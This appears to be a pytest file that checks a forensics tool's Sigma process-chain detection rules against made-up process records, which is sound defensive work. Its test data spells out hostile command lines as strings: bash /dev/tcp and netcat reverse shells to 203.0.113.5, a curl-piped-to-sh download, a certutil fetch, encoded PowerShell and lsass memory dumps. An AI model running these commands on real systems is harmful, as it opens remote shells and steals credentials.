"""The process-chain rules Nik ships (``backend/app/sigma/pack_chains/*.yml``) run by the real engine: each must be
supported by the check and, for a process it is meant for, match; for a process it is not meant for, stay silent.

The folder is the backend's: it is found in a checkout (``backend/app/sigma/pack_chains``), at ``NIK_SIGMA_CHAINS``,
or at ``/opt/nik-forensics/pack_chains`` (where a CI step that runs the tests in the image mounts it); without it
every test here is skipped and says why. A process is made here with the fields the API gives (``chains._given``):
harmless text, never evidence.
"""

# ruff: noqa: E501 - a command line is one line

from __future__ import annotations

import os
import uuid
from pathlib import Path

import pytest
import yaml
from nik_forensics.sigma import check
from nik_forensics.sigma.engine import Engine
from sigma_support import record

HERE = Path(__file__).resolve()
LEVELS = {"informational": 1, "low": 2, "medium": 3, "high": 4, "critical": 5}


def _folder() -> Path | None:
    wanted = [
        os.environ.get("NIK_SIGMA_CHAINS", ""),
        str(HERE.parents[3] / "backend/app/sigma/pack_chains"),
        "/opt/nik-forensics/pack_chains",
    ]
    for item in wanted:
        if item and Path(item).is_dir() and any(Path(item).glob("*.yml")):
            return Path(item)
    return None


FOLDER = _folder()
pytestmark = pytest.mark.skipif(
    FOLDER is None,
    reason="the process-chain rules (backend/app/sigma/pack_chains) are not here: mount the folder and set NIK_SIGMA_CHAINS",
)


def _texts() -> dict[str, str]:
    if FOLDER is None:
        return {}
    return {path.stem: path.read_text(encoding="utf-8") for path in sorted(FOLDER.glob("*.yml"))}


TEXTS = _texts()


def line_of(text: str) -> dict:
    document = yaml.safe_load(text)
    place = document.get("logsource") or {}
    return {
        "id": document["id"],
        "title": document["title"],
        "level": LEVELS[document["level"]],
        "kind": "rule",
        "product": place.get("product", ""),
        "category": place.get("category", ""),
        "service": place.get("service", ""),
        "source": text,
    }


def process(
    image: str, command: str = "", *ancestors: tuple[str, str], user: str = "alice", host: str = "H-1"
) -> tuple:
    """One record of the log source, as ``chains._given`` makes it: ``ancestors`` are ``(image, command line)``,
    the parent first."""
    parent = ancestors[0] if ancestors else ("", "")
    grand = ancestors[1] if len(ancestors) > 1 else ("", "")
    data = {
        "Image": image,
        "CommandLine": command,
        "User": user,
        "IntegrityLevel": "",
        "ParentImage": parent[0],
        "ParentCommandLine": parent[1],
        "GrandParentImage": grand[0],
        "GrandParentCommandLine": grand[1],
        "Ancestors": [one for one, _command in ancestors],
        "Depth": len(ancestors),
        "Host": host,
        "Platform": "windows" if ("\\" in image or image[1:2] == ":") else "linux",
    }
    return record(
        data, channel="", event_id=None, kind="process-chain", rtype="process", source="", host=host, username=user
    )


def of(image: str, command: str = "") -> tuple[str, str]:
    return (image, command)


W = "C:\\Windows\\System32\\"
CMD, PS, RUNDLL = W + "cmd.exe", W + "WindowsPowerShell\\v1.0\\powershell.exe", W + "rundll32.exe"
OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
SSHD, BASH = "/usr/sbin/sshd", "/bin/bash"
ENC = "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"

# stem -> (processes that must match, processes that must not)
CASES: dict[str, tuple[list[tuple], list[tuple]]] = {
    "chain-office-starts-shell": (
        [
            process(CMD, "cmd /c whoami", of(OFFICE + "WINWORD.EXE")),
            process(RUNDLL, "rundll32 x.dll,a", of(OFFICE + "EXCEL.EXE")),
        ],
        [
            process(CMD, "", of(W + "explorer.exe")),
            process(W + "notepad.exe", "", of(OFFICE + "WINWORD.EXE")),
            process(CMD),
        ],
    ),
    "chain-browser-starts-shell": (
        [
            process(PS, "powershell", of("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")),
            process(W + "mshta.exe", "", of("C:\\x\\msedge.exe")),
        ],
        [process(CMD, "", of(OFFICE + "WINWORD.EXE")), process(W + "notepad.exe", "", of("C:\\x\\chrome.exe"))],
    ),
    "chain-explorer-starts-hidden-powershell": (
        [
            process(PS, ENC, of(W + "explorer.exe")),
            process(PS, "powershell -w hidden -c x", of("C:\\Windows\\explorer.exe")),
        ],
        [
            process(PS, "powershell Get-Date", of(W + "explorer.exe")),
            process(CMD, ENC, of(W + "explorer.exe")),
            process(PS, ENC, of(CMD)),
        ],
    ),
    "chain-lsass-dump-under-shell": (
        [
            process(RUNDLL, "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\x.dmp full", of(PS)),
            process("C:\\tools\\procdump64.exe", "procdump64 -ma lsass.exe l.dmp", of(CMD)),
        ],
        [
            process(RUNDLL, "rundll32.exe comsvcs.dll, MiniDump 612 C:\\x.dmp full", of(W + "explorer.exe")),
            process(RUNDLL, "rundll32 shell32.dll,Control_RunDLL", of(PS)),
            process("C:\\tools\\procdump.exe", "procdump -ma notepad.exe", of(CMD)),
        ],
    ),
    "chain-psexec-service-starts-process": (
        [process(CMD, "cmd", of(W + "PSEXESVC.exe")), process(W + "whoami.exe", "", of("C:\\Windows\\paexec.exe"))],
        [process(CMD, "cmd", of(W + "services.exe")), process(W + "PSEXESVC.exe", "", of(CMD))],
    ),
    "chain-scheduled-task-starts-script-host": (
        [
            process(W + "wscript.exe", "wscript a.vbs", of(W + "taskeng.exe")),
            process(W + "cscript.exe", "cscript a.vbs", of(W + "svchost.exe", "svchost.exe -k netsvcs -p -s Schedule")),
        ],
        [
            process(W + "wscript.exe", "wscript a.vbs", of(W + "svchost.exe", "svchost.exe -k LocalService")),
            process(CMD, "cmd", of(W + "taskeng.exe")),
            process(W + "wscript.exe", "wscript a.vbs", of(W + "explorer.exe")),
        ],
    ),
    "chain-script-host-encoded-powershell": (
        [
            process(PS, ENC, of(W + "wscript.exe")),
            process(PS, "powershell -EncodedCommand SQBFAFg=", of(W + "mshta.exe")),
        ],
        [
            process(PS, "powershell Get-Date", of(W + "wscript.exe")),
            process(PS, ENC, of(W + "explorer.exe")),
            process(CMD, ENC, of(W + "wscript.exe")),
        ],
    ),
    "chain-service-starts-shell": (
        [
            process(CMD, "cmd /c x", of(W + "services.exe")),
            process(PS, "powershell", of("C:\\Windows\\system32\\services.exe")),
        ],
        [process(CMD, "cmd", of(W + "svchost.exe")), process(W + "net.exe", "net user", of(W + "services.exe"))],
    ),
    "chain-shell-reverse-shell-dev-tcp": (
        [
            process("/bin/bash", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", of(SSHD)),
            process("/usr/bin/sh", "sh -c 'exec 5<>/dev/tcp/203.0.113.5/80; cat <&5'"),
        ],
        [
            process("/bin/bash", "bash -c 'echo ok'"),
            process("/usr/bin/curl", "curl http://x/dev/tcp/ >&2"),
            process("/bin/bash", "bash -i >& /tmp/log"),
        ],
    ),
    "chain-shell-starts-netcat-execute": (
        [
            process("/usr/bin/nc", "nc -e /bin/sh 203.0.113.5 4444", of(BASH)),
            process("/usr/bin/ncat", "ncat 203.0.113.5 4444 --exec /bin/sh", of("/bin/dash")),
        ],
        [
            process("/usr/bin/nc", "nc -l 8080", of(BASH)),
            process("/usr/bin/nc", "nc -e /bin/sh x 1", of("/usr/bin/python3")),
            process(BASH, "bash -e", of(BASH)),
        ],
    ),
    "chain-signed-binary-starts-network-tool": (
        [
            process(W + "certutil.exe", "certutil -urlcache -f http://x/a a.exe", of(RUNDLL)),
            process(PS, "powershell", of(W + "mshta.exe")),
        ],
        [process(W + "certutil.exe", "certutil -hashfile a SHA1", of(CMD)), process(W + "notepad.exe", "", of(RUNDLL))],
    ),
    "chain-ssh-shell-pipes-download-to-shell": (
        [
            process(BASH, "bash -c 'curl -s http://203.0.113.5/x.sh | sh'", of(SSHD), of("/usr/sbin/sshd")),
            process("/bin/sh", "sh -c 'wget -qO- http://x/a|bash'", of(BASH), of(SSHD)),
        ],
        [
            process(BASH, "bash -c 'curl -s http://x/a -o a'", of(SSHD)),
            process(BASH, "bash -c 'curl -s http://x/a.sh | sh'", of("/usr/sbin/cron")),
            process("/usr/bin/curl", "curl http://x | sh", of(SSHD)),
        ],
    ),
    "chain-web-server-starts-shell-linux": (
        [
            process("/bin/sh", "sh -c id", of("/usr/sbin/apache2")),
            process(BASH, "bash", of("/usr/sbin/php-fpm8.2")),
            process(
                "/bin/sh",
                "sh -c id",
                of("/usr/bin/java"),
                of("/opt/tomcat/bin/catalina.sh"),
                of("/opt/tomcat/bin/tomcat"),
            ),
        ],
        [
            process("/bin/sh", "sh -c id", of("/usr/bin/java"), of("/usr/sbin/cron")),
            process("/usr/bin/id", "id", of("/usr/sbin/apache2")),
            process(BASH, "bash", of(SSHD)),
        ],
    ),
    "chain-web-server-starts-shell-windows": (
        [
            process(CMD, "cmd /c whoami", of("C:\\Windows\\System32\\inetsrv\\w3wp.exe")),
            process(
                PS, "powershell", of("C:\\Program Files\\Java\\bin\\java.exe"), of("C:\\tomcat9\\bin\\tomcat9.exe")
            ),
            process(CMD, "cmd", of("C:\\Program Files\\Microsoft SQL Server\\sqlservr.exe")),
        ],
        [
            process(W + "ipconfig.exe", "ipconfig", of("C:\\Windows\\System32\\inetsrv\\w3wp.exe")),
            process(CMD, "cmd", of("C:\\Program Files\\Java\\bin\\java.exe"), of(W + "explorer.exe")),
            process(CMD, "cmd", of(W + "explorer.exe")),
        ],
    ),
    "chain-winrm-starts-process": (
        [
            process(CMD, "cmd", of(W + "wsmprovhost.exe")),
            process(W + "whoami.exe", "whoami", of("C:\\Windows\\System32\\wsmprovhost.exe")),
        ],
        [process(W + "notepad.exe", "", of(W + "wsmprovhost.exe")), process(CMD, "cmd", of(W + "explorer.exe"))],
    ),
    "chain-wmi-starts-shell": (
        [
            process(CMD, "cmd /c x", of("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")),
            process(PS, "powershell", of(W + "wbem\\wmiprvse.exe")),
        ],
        [process(W + "notepad.exe", "", of(W + "wbem\\wmiprvse.exe")), process(CMD, "cmd", of(W + "svchost.exe"))],
    ),
}


def hits(stem: str, one: tuple) -> int:
    engine = Engine([line_of(TEXTS[stem])])
    return len(engine.see(*one))


def test_every_rule_of_the_pack_has_its_cases_and_every_case_its_rule():
    assert set(TEXTS) == set(CASES), (
        f"no case for {sorted(set(TEXTS) - set(CASES))}, a case for no file: {sorted(set(CASES) - set(TEXTS))}"
    )


@pytest.mark.parametrize("stem", sorted(TEXTS))
def test_a_chain_rule_is_a_supported_one_for_the_process_chain_log_source(stem):
    document = yaml.safe_load(TEXTS[stem])
    assert str(uuid.UUID(document["id"])) == document["id"]
    assert document["author"] == "Nik" and document["status"] in ("stable", "test") and document["level"] in LEVELS
    assert document["description"].strip()
    assert document["logsource"] == {"product": "nik", "service": "process-chain"}
    answer = check.check([{"source": TEXTS[stem]}])["documents"][0]
    assert answer["errors"] == []
    (info,) = answer["rules"]
    assert info["supported"], info["reason"]
    assert info["id"] == document["id"] and info["level"] == LEVELS[document["level"]]


def test_the_ids_of_the_chain_rules_are_all_different():
    ids = [yaml.safe_load(text)["id"] for text in TEXTS.values()]
    assert len(set(ids)) == len(ids) == len(TEXTS)


@pytest.mark.parametrize("stem", sorted(CASES))
def test_a_chain_rule_matches_the_processes_it_is_for_and_not_the_others(stem):
    if stem not in TEXTS:
        pytest.skip("no such file")
    must, must_not = CASES[stem]
    assert must and must_not
    for number, one in enumerate(must):
        assert hits(stem, one) == 1, f"process {number} ({one[9]['Image']}) should match"
    for number, one in enumerate(must_not):
        assert hits(stem, one) == 0, f"process {number} ({one[9]['Image']}) should not match"


def test_no_chain_rule_matches_the_records_of_another_log_source():
    other = record({"Image": CMD, "ParentImage": OFFICE + "WINWORD.EXE", "CommandLine": "cmd"}, event_id=1)
    for stem in TEXTS:
        assert hits(stem, other) == 0, stem
